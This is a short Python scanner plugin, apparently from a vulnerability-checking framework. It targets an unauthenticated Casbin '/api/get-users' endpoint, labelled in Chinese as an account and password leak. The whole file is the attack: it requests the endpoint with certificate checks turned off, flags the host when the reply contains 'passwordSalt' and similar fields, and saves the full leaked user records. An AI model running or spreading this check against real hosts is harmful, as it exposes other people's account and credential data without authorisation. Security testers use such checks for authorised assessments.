#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Casbin get-users 账号密码泄漏',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/api/get-users?p=123&pageSize=123'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "owner" in res.text and 'name' in res.text and 'passwordSalt' in res.text :
      ret['ifbug'] = True
      ret['huixian'] = res.text
      res.close()
      return ret
    else:
      return ret
  except:
   return ret